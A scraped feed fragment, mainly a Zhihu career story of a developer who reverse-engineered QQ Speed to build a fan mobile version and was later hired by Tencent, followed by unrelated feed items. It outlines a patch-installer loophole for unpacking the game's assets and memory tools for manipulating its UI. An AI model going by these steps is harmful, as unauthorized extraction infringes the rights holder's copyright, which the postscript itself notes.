猜测他被拒的原因是这最致命的三点：看脸！看脸！看脸！</p>\n<p>我下定决定要学习做游戏了，找到他的QQ。</p>\n<p>我：我想做游戏，我应该从哪方面入手？</p>\n<p>他：C#、Unity。</p>\n<p>我那.NET程序员朋友在下文中我就用RRQ表示他的名字。</p>\n<p>上面提到我猜测他面试失败的原因，他表示十分不服气。（那好，咱们就不提脸的事！咱们聊聊体重！哈哈哈~）</p>\n<p>我们的相处风格就是这样，见面就是互损，即使很长时间不联系也不陌生。</p>\n<p>看到被黑了，他顶多会立马QQ上\"威胁\"我，让我给他发红包，不然这事跟我没完。</p>\n<p>RRQ就是这样人，人特别好，很有大神风范！每当我们谁写出几句酷炫代码或者酷炫功能的时候，我们就会找到对方，问对方这个牛不牛，能打多少分。</p>\n<p>我学习C#他没少帮助我！他是我的好基友，也是引导我走向正路的师傅。就像我快饿死的时候接济我的人一样，我把他也当成我的贵人。</p>\n<p>当务之急就是学习游戏编程。我下载了最新版本的VS和Unity，还不急着直接学Unity，从头在老老实实学一遍C#（说是老老实实学一遍，其实我也只是大概看了下 - -）。</p>\n<p>看着满屏幕的英文就头大！天啊，我英文那么差，这让我如何是好？</p>\n<p>英文差没法写代码吗？肯定不是啊，后来我才发现，只要会了基本语法，其他都小意思。</p>\n<p>取个变量名或方法名的时候，写拼音也太戳了，不够逼格！去网上翻译一下，再copy过来用。每次取名字就得在网页里面翻译，好麻烦，我干脆调用网页翻译API写了一个小翻译器。</p>\n<p>看别人代码的时候，几乎都是骆驼命名法，直接复制过来翻译器无法识别进行翻译，所以我还加了一个小功能，自动分割大写字母，这样的话，只要英文没有缩写，几乎都是可以成功翻译的，大大提高了翻译效率。</p>\n<p>我也是没办法，做了这么个翻译器，笨人得给自己想出补自己缺陷的方法来，不然真的就会一直笨下去了。</p>\n<p>网上说直接学Unity，可以一边做一边学，我也感觉自己C#应该算是入门了，那就直接上Unity吧。</p>\n<p>在自学网站找到了一个教Unity的视频，但是上了几节课以后发现老师的代码跟上节课的代码不一样，这尼玛太坑了。继续往下看，发现老师他自己似乎都不怎么会Unity，代码写错了都不知道哪儿错了，然后直接跳到下一节课！！</p>\n<p>干脆不看视频了，按照自己的想法来，想做什么游戏，需要哪些功能，怎么实现，全部都去网上查，需要什么查什么。</p>\n<p>当时有个小游戏很火：《钢琴块儿》。看起来好像挺简单的，那就试着自己做一个吧！</p>\n<p>我的一个钢琴块就是一个cube，排了几百个cube，看着好恶心，有时候想改变其中一个cube的坐标，其它块也得重新改一遍。我得用代码去自动生成这写钢琴块才行！研究了一个星期，我把cube做成预制件，for循环随机生成了指定的黑块和白块，完美！就是这效果！</p>\n<p>按耐不住兴奋，恨不得马上给RRQ玩到我的第一个简陋的游戏。但是我又犯难了，不会发布成apk。继续百度，发现好麻烦，要装sdk，下载下来以后，unity又提示版本不对啥的，换了一个，打包中途又报错。</p>\n<p>继续换版本，来来回回折腾了一个通宵，终于打出了属于我自己的第一个apk包，别提多激动了！插上数据线连上手机安装了apk，看着在手机屏幕上出现unity logo的时候，我激动得发抖，我也可以做游戏了！</p>\n<p>做出来了第一个简陋的游戏，我并没有想着去完善它。</p>\n<p>我特别喜欢玩《QQ飞车》，从08年就开始就一直在玩。当时iPhone上有个韩文的单机版跑跑卡丁车，特别有PC端的感觉。但是我又那么喜欢玩QQ飞车，看着QQ飞车说自己同时在线几百万人，也出来那么多年了，就是没有出手机版。</p>\n<p>官方不做，我自己做！我想自己做一个《手机版QQ飞车》，让和我一样期待飞车手机版的小伙伴们都能玩到这款游戏。</p>\n<p>我把想法告诉了RRQ，他很支持我，跟我说在做的过程中遇到问题解决问题，等你做出来了，你会发现你会很多东西了。</p>\n<p>他不会unity，我想他C#那么厉害，C#这样学肯定没问题，unity这样学应该也行，那就开干。</p>\n<p>想做QQ飞车，那得有QQ飞车的人物模型、赛车模型、地图模型、贴图、动画，如果要做界面，还需要得到UI资源。当然，如果能得到代码更好，就算看不懂，注释还可以参考一下嘛。</p>\n<p> QQ飞车早在08年~10年这两年的所有版本安装包，有个漏洞。</p>\n<p>使用游戏升级补丁，新建res、data两个空文件夹，在把res.vfs、data.vfs和几个配置文件复制到空文件夹同目录下。改一下配置文件中的版本号，选择这两个文件夹所在的父目录进行补丁安装，vfs数据包就会完完整整的释放到新建的两个空文件夹中。</p>\n<p>当时释放出来后可以直接看到lua代码，现在lua释放出来都转换成机器码了，只有小部分能反编译回来，没多大用处。</p>\n<p>我虽然释放出所有资源了，但是我无法使用资源，仅仅能看到lua的代码注释 ......</p>\n<p>还是那句老话，既然游戏自己都能用，那说明还是有方法让我自己也能使用的，只是我不知道而已。</p>\n<p>我又花费了三个月时间研究如何让我自己能使用这些模型。nif是模型文件，那我用3DMAX应该就可以打开吧，那玩意不是专门做模型的嘛。</p>\n<p>下载安装完成又发现无法识别nif文件！懵了。</p>\n<p>网上搜了一下，原来有现成的工具打开这种格式，支持预览和导出obj。</p>\n<p>导出obj我拿来干啥，我还需要动作啊！这下不好找了，网上都翻烂了就是没有，然后去谷歌搜。找了好久看到曙光了，有个nif 3DMax2012插件，有点小激动，安装完成后再次导入nif，成功了居然。</p>\n<p>但是模型还是没有动作呀！！动作去哪儿了！！我看到nif同级目录下有很多.kf文件，看命名挺像动画文件的。</p>\n<p>小手一抖，把kf文件拖到3DMax界面里，哎哟喂，人物会动了。导出成fbx，拖到unity里面等着看效果。尼玛，怎么不会动呢？在3DMax里面还好好的。我以为是我导出有问题，又重新导了一遍，还是老样子。</p>\n<p>那是不是unity要设置什么呢？查了一下，还真是。</p>\n<p>按照教程操作了一遍，欧耶，我的人物在unity里面动起来了。动是动起来了，但是这人物怎么感觉像是抽风了一样，一点不自然，在3DMax里面也不自然。</p>\n<p>加了一个3DMax的群询问大神们，得到的回复是有可能编辑器不一样，导致动画丢帧。</p>\n<p>看样子只能自己调了！我又去找教程学习如果调3DMax动画......</p>\n<p>三个月时间就研究这些东西了。</p>\n<p>拿了两张地图《老街管道》《休闲区城镇》、一辆赛车雷诺、一个男孩带动画的模型。</p>\n<p>我先做的休闲区，第一步目标是人物可以在休闲区里面移动就行了。</p>\n<p>网上看别人代码怎么写的，参考后用CharacterController完成了控制人物移动。</p>\n<p>目前是键盘控制人物移动，手机哪有键盘啊！官方QQ飞车可以用鼠标点击地面移动人物，那我也可以点击地面移动人物啊。</p>\n<p>又研究到了寻路，发现unity自带了寻路：Navigation。</p>\n<p>查了资料发现使用起来非常简单，很快，我就做出来我点击地面，人物就自动移动到我点击的位置。</p>\n<p>现在又得加一个点击座位，人物会自动跑过去坐着。这和点击寻路其实有些冲突，在手机上操作很不方便，屏幕太小，本来你是要走过去就行了，不小心碰到椅子就坐上去了。于是我把点击地面寻路改成了摇杆控制移动，又学习到了一款插件：EasyTouch。</p>\n<p>哦了，休闲区就算大功告成了！这第一步我没日没夜的做了一个月才做满意，不感觉累。</p>\n<p>第一步做完了，可是一点游戏的样子没有，我得做游戏界面，这样子看起来有逼格些。</p>\n<p>界面素材的文件后缀名是.gsa，这种格式我关注了一年多，但一直没有解开。</p>\n<p>得不到界面素材，我就去游戏里面截图，然后自己PS。</p>\n<p>游戏中控件和控件的层级关系很复杂，我压根就没法正常截图！我试着做了一个叫SuperGUI的工具，可以通过内存随意操作游戏中的UI大小、位置、显示或隐藏。</p>\n<p>我稍微修改了一下SuperGUI的代码，把我想截图的UI移动到白色底板的区域，然后再截图，完美！</p>\n<p>自己其实不会PS，修图什么的又得学......</p>\n<p>界面素材已搞定，现在就差怎么用到unity里，于是我又学会了使用一款unity插件：NGUI。</p>\n<p>我这人有强迫症，一定要尽量把UI都布局得很好看很合理。花费一个星期左右的时间完成了登录界面、主界面、休闲区界面。</p>\n<p>那时候还不知道xml和json这种东西，我想做背包，物品描述信息这些东西我要存起来才行，如果都写在代码里面那太蛋疼了。</p>\n<p>于是我又学会了使用一款小巧的数据库：SQLite。我把物品信息数据全部存到了数据库里，感觉清爽多了。</p>\n<p>做背包需要物品icon，咋办！我想到了用SuperGUI去截图，但是有很多绝版赛车商城里面没有，我也就没法截图。</p>\n<p>我发现QQ飞车每个星期都会更新任务，每次更新的时候本地游戏文件夹中有几个在资源包外的未加密lua文件会变化，于是我就打开这些lual研究。</p>\n<p>原来他把任务描述信息写到了lua里面，还有任务图标的本地资源路径呢。</p>\n<p>那我如果改了这个任务图标的资源路径，是不是任务图标就会变成我指定路径的图标？试了一下，果然行得通！但是每改一下必须重新登录游戏才能生效。</p>\n<p>我写了一个自动修改任务描述lua里的资源路径工具，并且修改完成后自动登录游戏，自动截取资源图标保存到指定文件夹中。</p>\n<p>就这样不停的登录退出，我笔记本挂机挂了三天三夜，没停过。我得到了三万多个物品图标。现在想想我真是个疯子，这么low的方法都能想得出来！不过应了我微信的个性签名：“有时最土的方法是最有效的”。</p>\n<p>如果我当时我不那样去做，我就没法得到我想要的图标。整整三万个图标，我需要逐个在PS中裁剪、休整。太麻烦了，还好PS有个记录操作的功能，全自动完成了休整三万个图标这艰巨的任务。</p>\n<p>图标有了，准备做背包，可是又犯难了！</p>\n<p>我切换的装备下次我进入游戏应该还在才对，我服务器都没有，怎么记录？对！我要写个服务器才行。</p>\n<p>自己不懂真正服务器，只能找人求救。</p>\n<p> C#服务器RRQ教我弄了SQLServer、教我三层架构......</p>\n<p>有一次他远程我电脑操作给我看，他操作了差不多一个小时，我经常熬夜做这个游戏，太累，中途我不小心睡着了。</p>\n<p> QQ连续响了好几声给我吵醒了，原来是他在一直发消息：“你丫是不是睡着了”、“看懂了吗？”、“说话啊！”</p>\n<p>这个我记得最清楚。他气死了，我说我没看到，他说没看到活该！哈哈哈，我这不是太困了吗！当时他挺生气，后来还是又教我一遍怎么弄的。搞了一段时间，飞车可以登录游戏、注册游戏信息、同步个人信息、记录背包信息之类的。</p>\n<p>不知道是谁跟我说的，你这游戏又不能玩，那能叫游戏吗？我想想说得也对。所以服务器暂停了开发。</p>\n<p>我开始做核心玩法，做竞速赛。</p>\n<p>核心玩法谈何容易，网上虽然说有很多赛车的例子，但是没有一个是能很容易操作的。</p>\n<p>我学习WheelCollider，自己写赛车移动！网上的代码一大堆，做出来的效果却差得要命。研究了一个月，我只做出了基本的前后左右移动，赛车漂移太难做了，始终做不出来。做不出来不强求，那就缓缓，过段时间再做。</p>\n<p>QQ飞车里面赛车撞墙后可以按R键复位到赛道中间，我分析了他的思路。自己花一个星期时间写了一个CarWayPoints插件。</p>\n<p>做完插件正休息呢，打开飞车的配置文件看看，每个地图都有一个Map.txt，里面存的数据我一直不知道是干嘛的。我用自己写的CarWayPoints插件原理去尝试理解这些数字到底是代表什么意思。</p>\n<p>没想到真的还被我分析出来了！我写了一个工具，自动转换这些数字，为我CarWayPoints插件使用的data文件，完美运用！</p>\n<p>看看时间，时间过得好快，马上快过年了！今年一年我没赚到钱，仅仅是够生活而已。</p>\n<p>虽然学unity才半年时间，但我鼓起勇气在网上投简历去找工作。</p>\n<p>确定上班时间是年后，正好拿这个当借口，我打电话回家告诉父母我找到工作了，先让他们高兴高兴。然后我接着又说，我过年不回家了，因为年后就要上班，我怕我来不及。</p>\n<p>当时我心里很难受，他们知道这个消息后也不舒服，可谁让我这么没本事呢，这一年仅凭教跳舞赚的钱太少了，让我省吃俭用过日子，哪还有脸回家。</p>\n<p>虽然我知道父母不要求我什么，能回去他们就满足了，可是我就是这么好强的一个人，对谁都这样。</p>\n<p>过年我啥也没买，就买了几包烟过年。街上一个人都没有了，卖煎饼的小贩也回家过年了。年前也没有去买菜，我知道过年那几天菜很贵，我也知道到上海后租房吃饭是大问题，所以只买了瓶老干妈回来。</p>\n<p>没菜，煮点白米饭，吃着老干妈，写了CarWaypoints插件的说明文档，发布到博客上，当时过年还是有挺多人看博客的，但写博客的人很少。</p>\n<p>我的那篇文章成了一个星期内阅读量最多的文章。年就这样过去了。</p>\n<p>过完年 ，我拖着行李来到了一线大城市——上海。</p>\n<p>记得第一次来上海面试的时候，不会做地铁，不知道怎么买票，站旁边看了好几个人买票自己才上去试一下，坐地铁还坐过站了。出站的时候我看见别人都是在上面刷一下就出去了，我也跟着在后面刷，可是我怎么刷，我都走不出去。排在我后面的人看见了跟我说要把卡片插进去才可以！后来才知道人家那用的是公交卡，跟我手里的卡不一样。</p>\n<p>小时候，电视上说什么上海滩、大上海，还有夜上海那首歌，给我的印象是上海很大，都是有钱人的地方。</p>\n<p>十几岁的时候，追过一个女孩，那女孩的爸爸好像在上海工作当老板，她放暑假寒假也会去上海上补习班，经常去星巴克。没有追到她，但是我心里一直都是有阴影的，感觉自己配不上人家。她家里那么有钱，人又漂亮，在上海呆过见过大世面，星巴克我从来没有进去过，我当时都不知道里面到底是卖什么东西的，只知道里面一杯饮料就好几十块钱。</p>\n<p>上海从小到大给我的感觉就是可望不可即！可是今天，我也来上海了，来实现我的游戏梦！</p>\n<p>当时来面试的时候公司在一个大厂房里面，新公司在装修，临时在大厂房工作。</p>\n<p>去上班的那天，新公司装修好了！哇，好大，装修好漂亮！</p>\n<p>前台领我坐到了我的位置上，我正式入职了！</p>\n<p>刚进公司什么SVN、RTX、禅道啥都不知道，还好有个胖胖的程序员帮我，他人很好，刚进公司就跟他最熟了。</p>\n<p>下班时间到了，大家都逐渐离开了公司。胖胖的程序员问：“你还不走想加班啊？！”</p>\n<p>我心想我哪有地方去啊，身上就只有几百块钱。我说这不是等你一起走吗？</p>\n<p>离开公司后，我搜索了附近的青年旅社，看了几家，要么是太远，要么是人满了。后来在上海南站附近找了一家青年旅社，一晚上好像是30块钱。</p>\n<p>在青年旅社住了几天，我发现这样下去还撑不到发工资我就没钱吃饭了。</p>\n<p>晚上下班等大家都走了，我悄悄问胖胖的程序员能不能睡在公司，他说如果你愿意大冷天的睡公司没问题啊。</p>\n<p>他以为我是开玩笑的，没想到我真睡了。</p>\n<p>我把公司休闲区的沙发搬到空调底下，对着空调吹暖和一些，可是还是冷得不行，一晚上冻醒四五次，根本睡不好。我想只要熬过这第一个月就好了！</p>\n<p>我半个月没洗澡，头发都油成了一坨，身上也一股味道，还好大家嘴巴上都没有嫌弃我。</p>\n<p>我把剩下的钱一咬牙，找了一家最便宜的能洗澡的宾馆，300块钱，住了一晚上，把脏袜子洗了，然后洗了个澡！这是我半个月以来睡得最舒服的一次。</p>\n<p>钱花光了，没钱吃饭咯！如果加班的话，公司是免费提供晚餐的，所以我晚上待到很晚，这样一天就有一顿饭吃。</p>\n<p>熬过一个月，工资到手，好像是3800多点。心里很高兴，毕竟是自己人生的第一份正式工作。</p>\n<p>这时候项目总监跟我说现在要去深圳封闭开发三个月，包吃住，让我也去。我别提多高兴了，有吃的，还免费住，多好的事啊，果断签字同意了。</p>\n<p>我们公司是跟深圳一家大公司合作，是在南山科技园。</p>\n<p>到了深圳，我站在公司阳台上，看到了腾讯大厦，老激动了！</p>\n<p>下了班，我和主程特地跑过去近距离的在门口转悠了一会儿。</p>\n<p>我：“如果有一天我也能进腾讯多好。”</p>\n<p>主程：“唉，腾讯学历要求很严格的。”</p>\n<p>这家公司真的特别大，有一次听同事说这公司有好几个阳台，另外一个阳台有健身器材。我想过去瞅瞅，结果在公司迷路了......</p>\n<p>他们公司每个星期五下午会有点心，有时候是蛋糕，有时候是水果。他们公司的员工感觉就像是吃腻了一样，一点反应都没有......我们团队的人老激动了，每个人都拿了好几盒，哈哈！</p>\n<p>我们每天八点半起床走路半个多小时到公司，来得早的话还有早餐吃，来得晚的话啥也没有了。</p>\n<p>晚上正常下班，但我们程序一般会更晚，我和主程还有技术总监总是最晚的三个，回去的路上大家一起讨论今天的技术难点，哪些地方没有实现，有什么好的思路，很累，但很充实。</p>\n<p>在深圳我就一直改bug，扩展原有的小的新功能，跟主程一起维护战斗系统。我的进步很快，不过我很满足，因为吃住不用愁。</p>\n<p>结果在深圳封闭开发了两个月我们就回上海了，原因不太好讲。</p>\n<p>回上海后我们在深圳辛辛苦苦开发了两个月的新玩法被老板直接停掉了。唉......</p>\n<p>在深圳两个月存了些钱，足够租房子的，我跟执行策划和专门做UI的程序员三个人合租了一套房子。</p>\n<p>我这一间估计有不到十平米，一张床，一个电脑桌，一个衣柜就塞满了，1600一个月。上海的房子真贵，贵的吓人......</p>\n<p>公司开始慢慢愿意让我做一些功能了，我上班一年，做了7、8个系统功能，自己感觉还是收获挺多的。</p>\n<p>其中有个功能，因为当时上面急着要这个新功能，我预估时间需要半个月，最快也得十天，项目总监说如果你能一个星期做完，我奖励你一个机械键盘，说到做到。</p>\n<p>然后我每天爆肝，把功能在一个星期内做完了，键盘真的到手了！正高兴呢，不知道谁说了一句这键盘仅仅是使用权！使用权！使用权！卧槽。</p>\n<p>不过后来想了想无所谓，一个键盘700块，我买得起！加班加点一个星期之内能做完，说明我如果想做，还是可以做到的，对自己也是一种锻炼。</p>\n<p>我经常留得很晚，每天晚上就基本只剩我和技术总监两个人。因为自己太笨了，东西安排的也多，时间也很紧张，所以没办法每天都要工作到那么晚。但很晚也有好处，可以跟项目总监交流学习。</p>\n<p>每当我写代码写累了或者感觉他写代码写累了，我就会主动去喊他透透气，顺便聊天问一些自己不懂的地方。</p>\n<p>他人很好，很耐心地解释给我听，教我原理！他好像什么都懂，问他什么都知道。那肯定了，不然人家咋能当技术总监呢。</p>\n<p>下半年我熟悉了这个游戏，做东西也慢慢快了起来！但是我还是很晚才回去，到家了也继续研究我的飞车。</p>\n<p>有次在网上瞎逛，看到一个QQ飞车道具城，网页里有好多飞车里面的道具，可以直接购买。</p>\n<p>我看到那么多道具图标，心想我遍历一下，那岂不是所有道具图标我都能得到了吗！正好gsa文件我解不开，干脆从网页里直接获取。于是写了一个小程序，通过道具地址+道具ID把所有道具图片资源都遍历下载了下来。</p>\n<p>哈哈，踏破铁鞋无觅处，得来全不费工夫。</p>\n<p>好事接二连三的发生，我在网上看到一坨代码，看起来像是解析某个图像的。我研究了一下，他解析的图像跟gsa文件的结构特别像！我又激动了。</p>\n<p>那些代码我不知道是用什么语言写的，但是我能看懂，我就把那些代码翻译成了C#代码。好多API不一样，一百来句代码我翻译成C#搞了好几个小时，终于能跑通了。</p>\n<p>把gsa文件读入进来解析试试！卧槽！成功了居然，居然把gsa文件给解析出来了。但是有色差，应该是代码写错了，找到问题所在，修复了这个bug，成功写出gsa解析器。我发现一个一个手动解析速度太慢，干脆递归遍历所有gsa，全部自动解析得了。</p>\n<p>就这样，我从网页上的一坨代码翻译成C#，做了一个gsa解析器，得到了飞车里所有高清图片资源。</p>\n<p>资源是拿到了，可是现在暂时不用，我现在是全心全意的在研究赛车漂移呢。以前我一直在研究WheelCollider，想用他做出飞车那样的效果，可是发现这个组件真的很蛋疼。</p>\n<p>很多东西我想改，但是不能改，因为我没代码啊。</p>\n<p>干脆一不做二不休，我放弃了WheelCollider，直接操作刚体，使用addforce模拟动力。</p>\n<p>轮胎悬挂全部都是模拟出来的假象，正像飞车那样，真实的赛车哪有那样的物理效果啊？都是模拟出来的假象。</p>\n<p>漂移也很轻松的做出来了感觉，但是离我想要的漂移还差得有些距离，不过没关系，我相信我肯定可以做出来，只是时间问题而已。</p>\n<p>匆匆忙忙又是一年，春节后回公司我就立即提交了离职申请，我不知道我当时为什么会这么急，只知道心里很乱、很烦。</p>\n<p>憋了一段时间后跟朋友提起这件事，朋友说我还是太年轻、太浮躁！或许吧！我也不知道。</p>\n<p>这是我的第一份正经工作，从进入公司的那天起，心里别提多高兴了，我终于也可以做游戏了，这对于我来说，真的好不容易。</p>\n<p>离开公司有多方面原因的，我最大的不舍就是技术总监老蒙和嘻嘻哈哈的团队。虽然跟策划撕逼，但是大家也是为了让游戏更好，私下都相处得不错的。</p>\n<p>技术总监老蒙帮助了我很多，从他身上我学到的不仅有技术，还有对待事情的态度。</p>\n<p>那天请吃离别饭，团队的二十多个人都到了，美术不熟，没叫。大家一起开开心心地吃饭。</p>\n<p>那天老蒙主动开了瓶啤酒，我很惊讶，老蒙从来没见过他喝酒的。平时工作累，身体太虚了，我喝了两瓶酒下肚，有点晕晕的。以前一个人能喝一箱，和以前比起来感觉差多了。</p>\n<p>我让老蒙旁边的程序坐到了我的位置上，跟老蒙聊着天。</p>\n<p>说着说着我不知道咋的就哭了，哭得话都说不清楚了。老蒙帮我真的太多，我没有什么能感谢他的，也只能希望在今后的路上自己更加努力，别让他失望。</p>\n<p>我交接工作文档写好的时候发给他，让他验收，他这才知道我要离职。我一直没勇气跟他说我要离职，我不知道怎么开口。</p>\n<p>他QQ收到了我的文档，过了好久，他才回复我：“你真的忍心抛下我们就这样走了吗？虽然说人各有志，但是我自私点，我还是希望你能留下来。”</p>\n<p>看到这句话，我心里更不是滋味！</p>\n<p>老蒙，你就当是我年少轻狂不懂事吧，对不起，做出这个让大家都难过的决定。如果有机会，我们以后再一起共事。</p>\n<p>裸辞后发现工作现在真的好难找！好多公司都倒闭了，市面上U3D程序一抓一大把。</p>\n<p>投了好多家简历，看见招人我就投，大多数都是投出去就没消息了。</p>\n<p>后来有一家公司愿意要我，叫我去面试。</p>\n<p>他听了我的介绍，说我是他见过路子最野的程序员，也是他见过的学历最低的程序员。听到这里，我以为又没戏了，可是他要我了，他表示他看好我，想试一试。</p>\n<p>好吧，既然这么看好我，那我也尽全力，争取不让看好我的人失望。</p>\n<p>在决定录用前，项目总监告诉我他们开了一个十年项目经验的程序员，还有个大厂出来的也被开了。</p>\n<p>我瞬间亚历山大，心想那么叼的人都被开，我这才一年工作经验，能胜任吗？</p>\n<p>我怕我把他们坑了，所以我告诉他，距离我入职还有十天时间，这十天我会做一个demo，如果达不到你们想要的效果，我就不入职了。</p>\n<p>他说不用给自己这么大压力的！可我是认真的。</p>\n<p>我花了三天时间做了一个demo，录制了视频发过去，他表示还不错，比之前的人做得好。</p>\n<p>得到认可，我心里总算舒缓一些了。</p>\n<p>做之前我心里也没底，甚至不知道自己能不能做出来。或许我只是用心尽全力去做了，技术跟他们相比我还差得太远太远。</p>\n<p>用心尽全力去做游戏，不能让看好我的人失望，不能让自己失望，仅此而已。</p>\n<p>这家公司到底能不能让我留下来，我不知道。在这种不确定的情绪里，我产生了个念头，开始在博客上写这篇文，回顾下这些年都经历了什么。</p>\n<p>不是我傲娇，只是很多时候我不甘于现状想往上爬，因为没有退路，掉下去就可能再也爬不上来了。</p>\n<p>等我哪天落魄了或者牛逼了，回头看看，或许才知道我年轻时的决定到底是对还是错。</p>\n<p>幸运的是，这家公司最后还是要了我，总共三个程序员，只有我有过赛车游戏的经验，负责开发赛车控制和玩法部分。</p>\n<p>工作还是很忙，但我已经习惯了这种节奏，只是有时感到比以前孤独，下班回到家就继续研究自己的游戏。</p>\n<p>有天凌晨，一个人突然加了我的QQ，联系我，说他是腾讯的。</p>\n<p>我心里一惊，觉得这肯定是个骗子，他又说了些事我才勉强相信，结果下一句又让我怀疑起来。</p>\n<p>他说《QQ飞车》项目组看到了你的博客，大家对你的经历很感兴趣，有没有空来深圳聊聊？</p>\n<p>我心想这该不会是要诓我过去，然后当场抓起来吧。毕竟我拿到的一些游戏资源，其实是反编译的，说不准会告我侵权，心里挺害怕的。</p>\n<p>但冷静之后想一想，我一没靠这东西盈利，二又穷得叮当响，想骗我也骗不到钱，能有什么损失？</p>\n<p>后面就买了机票，背着电脑来到深圳，好像又回到了跟着主程在深圳封闭开发，特地跑去腾讯大门口转悠的时候。</p>\n<p>来了之后发现没有骗我，也没有想象中的三堂会审，而是喊了超多人一起去吃饭，场面很壮观，对我态度也很亲切。作为一个《QQ飞车》的老玩家，我真是受宠若惊，后来才知道里面有那么多大佬。</p>\n<p>吃完饭他们带着我在工作室参观了一圈，也听我讲了自己的故事，在休闲区我把电脑打开，给他们展示了自己还不成熟的作品，但大家都很给面子，一个个排队试玩，让我高兴得头晕。</p>\n<p>他们鼓励我来应聘试试，我也认真准备了。后来回到上海，一边上班一边等消息，不敢抱希望，但又很不想失望，晚上辗转反侧。</p>\n<p>有天上班的时候接到电话，我好像有种预感，站起来接了，感觉难以置信，像梦里一样恍惚，居然真的有机会参与做官方的飞车手游，而不再是一个人的自娱自乐。</p>\n<p>就这样，我来到了天美。</p>\n<p>转眼已经过去了5年，我还是每天下班了会玩会飞车，我的企业微信签名也一直都是“疯狂漂移中...”。</p>\n<p>它成了一种习惯，一个第二世界，开发它的想法把我从最颓废的一年里拔了出来，学习编程技术，一步步走到今天，我也希望能继续看着它，能开向多远的未来。</p>\n<p><b>后记：</b></p>\n<p>《QQ飞车》项目组最初因博客上的文章注意到了“热心玩家”阿升，考虑到他的反编译行为未构成盈利，也未将破解资源向第三方公布，以及他个人研究的初衷，决定当面友好沟通。</p>\n<p>在面谈与体验他的《手机版QQ飞车》后，项目组更多被他作为老玩家的热忱所打动，最终决定不追责他的侵权行为，但仍保留权利，并鼓励他参与正式的应聘流程。阿升也最终成功通过社招，参与到官方版《QQ飞车手游》的研发中。</p>\n<p>未经软件著作权人许可，反编译软件资源并向第三方提供的，均属违法侵权行为，也是不被提倡的。希望有意参与研发过程的同学，都能努力提升自己，并参与正式的应聘流程，踏上青睐的职业道路！</p>\n<a href=\"https://www.zhihu.com/question/24665653/answer/1774740320\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-d2477d3da63f772ccf6f9d8703c75e9c_bh.jpg\" data-image-width=\"1080\" data-image-height=\"855\" class=\"internal\">在腾讯互娱（IEG）的工作是怎样一番体验？</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/tian-mei-gong-zuo-shi-21?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">腾讯天美工作室群</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/289686285/answer/2101037072?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">13 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/48933183?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">自学编程想写游戏应该如何起步？</a><br><a href=\"http://www.zhihu.com/question/26723491?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">想要去网易做游戏需要什么技能？</a><br>\n","link":"http://www.zhihu.com/question/289686285/answer/2101037072?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"109 名烈士终于回家，这是最好的开学第一课。从他们身上你感受到了什么？有什么想对他们说的 ？","date":"2021-09-03 08:31:24","description":"\n<p></p>\n<a href=\"https://www.zhihu.com/video/1417159814925905920\">山河无恙，英灵安息！</a><p>志愿军烈士祭文，听哭了！</p>\n<p>“魂兮归来，布奠倾觞”</p>\n<p>9月3日上午</p>\n<p>沈阳抗美援朝烈士陵园庄严而肃穆</p>\n<p>第八批在韩中国人民志愿军烈士遗骸</p>\n<p>安葬仪式在这里举行</p>\n<p><br></p>\n<p>天地英雄气，千秋尚凛然</p>\n<p>让我们一起送英烈最后一程</p>\n<p>愿他们在祖国的大地上安息</p>\n<p><b>致敬人民英雄永垂不朽！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/zhong-guo-tui-yi-jun-ren-80?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">中国退役军人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484341681/answer/2100938940?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">325 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/452226885?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">身边认识的人家中曾经出过烈士和英雄是一种怎样的体验？他们曾经有哪些感人的事迹或故事？</a><br><a href=\"http://www.zhihu.com/question/482921104?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">9月2日，第八批在韩志愿军烈士遗骸运送回国，哪些志愿军的事迹令你印象最深，我们该如何铭记他们？</a><br>\n","link":"http://www.zhihu.com/question/484341681/answer/2100938940?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"开学季 | 工具升值包上新、正版软件特惠，还有联名开学礼包等你拿","date":"2021-09-03 08:30:03","description":"\n<p>少数派一直在帮助用户发现和了解桌面 / 移动平台上的优质应用，并希望通过全面的介绍和深度的用法让这些实用工具真正为你所用。马上又到开学的时候了，少数派软件商城为各位学生朋友们又特约了多款口碑、质量都非常优秀的学习相关应用的优惠活动，希望能够帮大家提升学习、工作的效率，快来看看有没有你需要的应用吧。</p>\n<p>🎉 <a href=\"https://sspai.com/mall/discount/%E5%BC%80%E5%AD%A6%E5%AD%A3%E4%BF%83%E9%94%80\" target=\"_blank\">少数派网站活动专区</a> | <a href=\"https://shop184770392.taobao.com/category-1613446274.htm?spm=a1z10.1-c-s.w4010-23900684904.8.6d852ac4HmtoUX&amp;search=y&amp;parentCatId=1613446273&amp;parentCatName=%BB%EE%B6%AF%D7%A8%C7%F8&amp;catName=%BF%AA%D1%A7%BC%BE#bd\" 